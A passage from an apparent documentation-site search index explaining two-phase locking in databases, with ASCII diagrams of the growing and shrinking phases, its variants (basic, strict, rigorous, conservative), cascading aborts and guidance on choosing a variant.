\u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Duration: From LOCK POINT to COMMIT/ABORT               \u2502\n\u2502                                                         \u2502\n\u2502 RULES:                                                  \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 \u2705 CAN release locks                     \u2502           \u2502\n\u2502 \u2502 \u2705 CAN downgrade locks (exclusive\u2192shared)\u2502           \u2502\n\u2502 \u2502 \u274c CANNOT acquire new locks              \u2502           \u2502\n\u2502 \u2502 \u274c CANNOT upgrade locks                  \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 CHARACTERISTICS:                                        \u2502\n\u2502 \u2022 Transaction releases resources                        \u2502\n\u2502 \u2022 Lock count decreases monotonically                    \u2502\n\u2502 \u2022 No new lock can be acquired                           \u2502\n\u2502 \u2022 Phase ends at COMMIT/ABORT                            \u2502\n\u2502                                                         \u2502\n\u2502 TRIGGER:                                                \u2502\n\u2502 \u2022 First lock release triggers transition                \u2502\n\u2502   from GROWING to SHRINKING                             \u2502\n\u2502 \u2022 Once in SHRINKING, cannot go back                     \u2502\n\u2502 \u2022 Irreversible phase transition                         \u2502\n\u2502                                                         \u2502\n\u2502 ALLOWED OPERATIONS:                                     \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 1. UNLOCK(X) - Release lock on X         \u2502           \u2502\n\u2502 \u2502 2. DOWNGRADE(X) - Exclusive \u2192 Shared     \u2502           \u2502\n\u2502 \u2502 3. READ(X) - Read still-locked resource  \u2502           \u2502\n\u2502 \u2502 4. WRITE(X) - Write still-locked resource\u2502           \u2502\n\u2502 \u2502 5. COMMIT - End transaction              \u2502           \u2502\n\u2502 \u2502 6. ABORT - Rollback transaction          \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Timeline Example:                                       \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 \u2500\u2500\u2500 After LOCK POINT \u2500\u2500\u2500                 \u2502           \u2502\n\u2502 \u2502 t8: UNLOCK(C) \u2713        [2 locks]         \u2502           \u2502\n\u2502 \u2502     (SHRINKING phase started!)           \u2502           \u2502\n\u2502 \u2502 t9: UNLOCK(B) \u2713        [1 lock]          \u2502           \u2502\n\u2502 \u2502 t10: UNLOCK(A) \u2713       [0 locks]         \u2502           \u2502\n\u2502 \u2502 t11: COMMIT                               \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Complete Phase Diagram:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    COMPLETE TWO-PHASE LOCKING PHASE DIAGRAM             \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  Locks                                                  \u2502\n\u2502  Held                                                   \u2502\n\u2502   \u25b2                                                     \u2502\n\u2502   \u2502            \u250c\u2500\u2500\u2500 LOCK POINT                          \u2502\n\u2502   \u2502            \u2502    (Max locks)                         \u2502\n\u2502   \u2502            \u2502                                        \u2502\n\u2502 5 \u2502            \u25cf                                        \u2502\n\u2502   \u2502           \u2571\u2502\u2572                                       \u2502\n\u2502 4 \u2502          \u2571 \u2502 \u2572                                      \u2502\n\u2502   \u2502         \u2571  \u2502  \u2572                                     \u2502\n\u2502 3 \u2502        \u25cf   \u2502   \u25cf                                    \u2502\n\u2502   \u2502       \u2571    \u2502    \u2572                                   \u2502\n\u2502 2 \u2502      \u25cf     \u2502     \u25cf                                  \u2502\n\u2502   \u2502     \u2571      \u2502      \u2572                                 \u2502\n\u2502 1 \u2502    \u25cf       \u2502       \u25cf                                \u2502\n\u2502   \u2502   \u2571        \u2502        \u2572                               \u2502\n\u2502 0 \u2502\u2500\u2500\u25cf         \u2502         \u25cf\u2500\u2500                            \u2502\n\u2502   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Time            \u2502\n\u2502     BEGIN      \u2502                  COMMIT                \u2502\n\u2502                \u2502                                        \u2502\n\u2502                \u2502                                        \u2502\n\u2502   \u251c\u2500 GROWING \u2500\u2500\u2524\u2500\u2500\u2500 SHRINKING \u2500\u2500\u2524                       \u2502\n\u2502      PHASE          PHASE                               \u2502\n\u2502                                                         \u2502\n\u2502   Transition rule:                                      \u2502\n\u2502   \u2022 Can move GROWING \u2192 SHRINKING (first unlock)         \u2502\n\u2502   \u2022 Cannot move SHRINKING \u2192 GROWING (irreversible!)     \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>State Transition Diagram:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         2PL STATE TRANSITION DIAGRAM                    \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502                                                         \u2502\n\u2502      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                   \u2502\n\u2502      \u2502   NOT        \u2502                                   \u2502\n\u2502      \u2502  STARTED     \u2502                                   \u2502\n\u2502      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                                   \u2502\n\u2502             \u2502                                           \u2502\n\u2502             \u2502 BEGIN                                     \u2502\n\u2502             \u2502                                           \u2502\n\u2502             \u25bc                                           \u2502\n\u2502      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                   \u2502\n\u2502      \u2502   GROWING    \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                       \u2502\n\u2502      \u2502    PHASE     \u2502           \u2502                       \u2502\n\u2502      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502                       \u2502\n\u2502             \u2502                   \u2502                       \u2502\n\u2502             \u2502 Operations:       \u2502 Can loop:             \u2502\n\u2502             \u2502 \u2022 Lock(X) \u2713       \u2502 \u2022 More locks          \u2502\n\u2502             \u2502 \u2022 Upgrade(X) \u2713    \u2502 \u2022 More upgrades       \u2502\n\u2502             \u2502 \u2022 Read(X) \u2713       \u2502 \u2022 More reads          \u2502\n\u2502             \u2502 \u2022 Write(X) \u2713      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502             \u2502                                           \u2502\n\u2502             \u2502 First UNLOCK(X)                           \u2502\n\u2502             \u2502 (irreversible!)                           \u2502\n\u2502             \u25bc                                           \u2502\n\u2502      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                   \u2502\n\u2502      \u2502  SHRINKING   \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                       \u2502\n\u2502      \u2502    PHASE     \u2502           \u2502                       \u2502\n\u2502      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502                       \u2502\n\u2502             \u2502                   \u2502                       \u2502\n\u2502             \u2502 Operations:       \u2502 Can loop:             \u2502\n\u2502             \u2502 \u2022 Unlock(X) \u2713     \u2502 \u2022 More unlocks        \u2502\n\u2502             \u2502 \u2022 Downgrade(X) \u2713  \u2502 \u2022 More downgrades     \u2502\n\u2502             \u2502 \u2022 Read(X) \u2713       \u2502                       \u2502\n\u2502             \u2502 \u2022 Write(X) \u2713      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502             \u2502                                           \u2502\n\u2502             \u2502 COMMIT/ABORT                              \u2502\n\u2502             \u2502                                           \u2502\n\u2502             \u25bc                                           \u2502\n\u2502      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                   \u2502\n\u2502      \u2502   ENDED      \u2502                                   \u2502\n\u2502      \u2502  (All locks  \u2502                                   \u2502\n\u2502      \u2502  released)   \u2502                                   \u2502\n\u2502      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                                   \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Why Two Phases are Necessary:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502      WHY TWO DISTINCT PHASES ARE NECESSARY              \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 What if we allowed mixed acquisition/release?           \u2502\n\u2502                                                         \u2502\n\u2502 \u274c VIOLATION EXAMPLE (Non-Serializable):                \u2502\n\u2502                                                         \u2502\n\u2502 T1:                          T2:                        \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500            \u2502\n\u2502 Lock(A)                                                 \u2502\n\u2502 Read A (value=100)                                      \u2502\n\u2502 Unlock(A) \u26a0\ufe0f                                            \u2502\n\u2502                              Lock(A)                    \u2502\n\u2502                              Write A = 200              \u2502\n\u2502                              Unlock(A)                  \u2502\n\u2502 Lock(A) \u26a0\ufe0f (re-acquire!)                                \u2502\n\u2502 Read A (value=200) \u2190 CHANGED!                           \u2502\n\u2502 Lock(B)                                                 \u2502\n\u2502 Write B = A + 50 (250)                                  \u2502\n\u2502 Unlock(A), Unlock(B)                                    \u2502\n\u2502 Commit                                                  \u2502\n\u2502                                                         \u2502\n\u2502 Problem: T1 sees non-repeatable read!                   \u2502\n\u2502         NOT SERIALIZABLE!                               \u2502\n\u2502                                                         \u2502\n\u2502 \u2705 WITH 2PL (Serializable):                             \u2502\n\u2502                                                         \u2502\n\u2502 T1:                          T2:                        \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500            \u2502\n\u2502 Lock(A)                                                 \u2502\n\u2502 Read A (value=100)                                      \u2502\n\u2502 Lock(B)                                                 \u2502\n\u2502 Write B = A + 50 (150)                                  \u2502\n\u2502 \u2500\u2500\u2500 LOCK POINT \u2500\u2500\u2500                                      \u2502\n\u2502 Commit (releases A, B)                                  \u2502\n\u2502                              Lock(A)                    \u2502\n\u2502                              Write A = 200              \u2502\n\u2502                              Unlock(A)                  \u2502\n\u2502                              Commit                     \u2502\n\u2502                                                         \u2502\n\u2502 Result: SERIALIZABLE (T1 before T2)                     \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#455-different-types-of-two-phase-locking","title":"4.5.5 Different Types of Two-Phase Locking","text":"<p>Description:</p> <p>While basic 2PL guarantees serializability, it has limitations (like cascading aborts). Several variants of 2PL have been developed to address different requirements. Each type offers different trade-offs between concurrency, safety, and implementation complexity.</p> <p>Evolution of 2PL Variants:</p> <p>The different types of 2PL didn't emerge randomly - they evolved from real-world production problems encountered when deploying basic 2PL in the 1970s and 1980s:</p> <ol> <li>Basic 2PL (1976): Original protocol, theoretically sound but had cascading abort problem</li> <li>Problem discovered: One transaction abort could trigger dozens of aborts</li> <li> <p>Real incident: IBM System R experienced cascading aborts that rolled back hours of work</p> </li> <li> <p>Strict 2PL (late 1970s): Developed to prevent cascading aborts</p> </li> <li>Motivation: Production systems needed predictable recovery</li> <li> <p>Became the de facto standard for commercial databases</p> </li> <li> <p>Rigorous 2PL (early 1980s): Simplified implementation for embedded systems</p> </li> <li>Motivation: Reduce complexity in lock managers</li> <li> <p>Trade-off: Lower concurrency for simpler code</p> </li> <li> <p>Conservative 2PL (1980s): Designed for real-time systems requiring deadlock prevention</p> </li> <li>Motivation: Medical devices, industrial control systems can't tolerate deadlocks</li> <li>Trade-off: Requires knowing all resources upfront</li> </ol> <p>Why Multiple Variants Exist:</p> <p>There's no \"one size fits all\" because different systems have different priorities:</p> <p>Banking Systems (Strict 2PL): - Priority: No dirty reads (prevent reading uncommitted transfers) - Tolerance: Can handle occasional deadlocks - Choice: Strict 2PL - prevents cascading aborts, allows early shared lock release</p> <p>Real-Time Control Systems (Conservative 2PL): - Priority: Guaranteed deadlock-free operation - Tolerance: Can accept lower throughput - Choice: Conservative 2PL - pre-declare all resources</p> <p>Critical Infrastructure (Rigorous 2PL): - Priority: Maximum safety, simple recovery - Tolerance: Lower concurrency acceptable - Choice: Rigorous 2PL - hold all locks until commit</p> <p>Research Databases (Basic 2PL): - Priority: Maximum concurrency for experiments - Tolerance: Complex recovery acceptable - Choice: Basic 2PL - release locks early</p> <p>The Cascading Abort Problem (Why Variants Matter):</p> <p>To understand why variants exist, consider this disaster scenario with basic 2PL:</p> <pre><code>T1: Processes customer order (100 steps)\n    Step 50: Updates inventory\n    Step 51: Releases inventory lock (shrinking phase starts)\n    Step 75: ERROR - payment processing fails\n    ABORT!\n\nT2: Read inventory from T1 (uncommitted)\n    Made business decision based on this\n    Now must ABORT (cascading abort)\n\nT3: Read data from T2 (uncommitted)\n    Must ABORT (cascading)\n\nT4: Read data from T3...\n    Must ABORT (cascading)\n\n... potential for 100+ cascading aborts!\n</code></pre> <p>This actually happened in early database systems, sometimes causing hours of work to be lost. Strict 2PL was invented specifically to prevent this nightmare scenario.</p> <p>Choosing the Right Variant - Decision Framework:</p> <p>The choice isn't just technical - it's about understanding your system's operational requirements:</p> <pre><code>Question 1: Can you tolerate cascading aborts?\n\u251c\u2500 No  \u2192 Not Basic 2PL\n\u2514\u2500 Yes \u2192 Maybe Basic 2PL (rare in practice)\n\nQuestion 2: Do you need deadlock prevention?\n\u251c\u2500 Yes \u2192 Conservative 2PL\n\u2514\u2500 No  \u2192 Continue\n\nQuestion 3: Is implementation simplicity critical?\n\u251c\u2500 Yes \u2192 Rigorous 2PL\n\u2514\u2500 No  \u2192 Strict 2PL (most common choice)\n</code></pre> <p>Industry Standard Choice:</p> <p>Strict 2PL emerged as the industry standard (used by 90%+ of production databases) because it offers the best balance: - \u2705 Prevents cascading aborts (unlike basic 2PL) - \u2705 Allows reasonable concurrency (unlike rigorous 2PL) - \u2705 Doesn't require pre-declaration (unlike conservative 2PL) - \u2705 Well-understood and extensively tested</p> <p>When in doubt, choose Strict 2PL - it's the \"sensible default\" that works well for most applications.</p> <p>Overview of 2PL Types:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         FOUR TYPES OF TWO-PHASE LOCKING                 \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 1. BASIC 2PL (Standard Two-Phase Locking)               \u2502\n\u2502    \u2022 Locks released anytime in shrinking phase          \u2502\n\u2502    \u2022 Serializability guaranteed                         \u2502\n\u2502    \u2022 Cascading aborts possible \u26a0\ufe0f                       \u2502\n\u2502                                                         \u2502\n\u2502 2. STRICT 2PL (Most commonly used)                      \u2502\n\u2502    \u2022 Exclusive locks held until COMMIT/ABORT            \u2502\n\u2502    \u2022 Shared locks can be released early                 \u2502\n\u2502    \u2022 Prevents cascading aborts \u2713                        \u2502\n\u2502                                                         \u2502\n\u2502 3. RIGOROUS 2PL (Strongest isolation)                   \u2502\n\u2502    \u2022 ALL locks held until COMMIT/ABORT                  \u2502\n\u2502    \u2022 Both shared and exclusive                          \u2502\n\u2502    \u2022 Simplest to implement                              \u2502\n\u2502                                                         \u2502\n\u2502 4. CONSERVATIVE 2PL (Deadlock-free)                     \u2502\n\u2502    \u2022 ALL locks acquired before execution                \u2502\n\u2502    \u2022 No locks acquired during execution                 \u2502\n\u2502    \u2022 Deadlock prevention \u2713                              \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#type-1-basic-2pl-standard-two-phase-locking","title":"Type 1: Basic 2PL (Standard Two-Phase Locking)","text":"<p>Description:</p> <p>The basic or standard 2PL is the original protocol we've discussed. Locks can be released anytime during the shrinking phase, but once any lock is released, no new locks can be acquired.</p> <p>Rules:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502             BASIC 2PL - RULES                           \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 GROWING PHASE:                                          \u2502\n\u2502 \u2022 Acquire locks as needed                               \u2502\n\u2502 \u2022 Upgrade locks (shared \u2192 exclusive)                    \u2502\n\u2502 \u2022 Cannot release any lock                               \u2502\n\u2502                                                         \u2502\n\u2502 SHRINKING PHASE:                                        \u2502\n\u2502 \u2022 Release locks as soon as not needed                   \u2502\n\u2502 \u2022 Can release locks individually                        \u2502\n\u2502 \u2022 Cannot acquire new locks                              \u2502\n\u2502                                                         \u2502\n\u2502 COMMIT/ABORT:                                           \u2502\n\u2502 \u2022 May happen during shrinking phase                     \u2502\n\u2502 \u2022 Some locks may already be released                    \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Timeline Diagram:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502          BASIC 2PL - TIMELINE                           \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  Locks                                                  \u2502\n\u2502  Held                                                   \u2502\n\u2502   \u25b2                                                     \u2502\n\u2502   \u2502        LOCK POINT                                   \u2502\n\u2502   \u2502            \u25cf                                        \u2502\n\u2502   \u2502           \u2571 \u2572                                       \u2502\n\u2502 3 \u2502          \u2571   \u2572                                      \u2502\n\u2502   \u2502         \u2571     \u2572                                     \u2502\n\u2502 2 \u2502        \u25cf       \u25cf                                    \u2502\n\u2502   \u2502       \u2571         \u2572                                   \u2502\n\u2502 1 \u2502      \u25cf           \u25cf                                  \u2502\n\u2502   \u2502     \u2571             \u2572                                 \u2502\n\u2502 0 \u2502\u2500\u2500\u2500\u2500\u25cf               \u25cf\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25cf\u2500                       \u2502\n\u2502   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Time           \u2502\n\u2502     BEGIN  \u2502          \u2502        \u2502  \u2502                     \u2502\n\u2502            \u2502          \u2502      Unlock COMMIT              \u2502\n\u2502            \u2502          \u2502      more                       \u2502\n\u2502            \u2502          Unlock locks                      \u2502\n\u2502            \u2502          first                             \u2502\n\u2502            \u2502          lock                              \u2502\n\u2502          Acquire                                        \u2502\n\u2502          all locks                                      \u2502\n\u2502                                                         \u2502\n\u2502   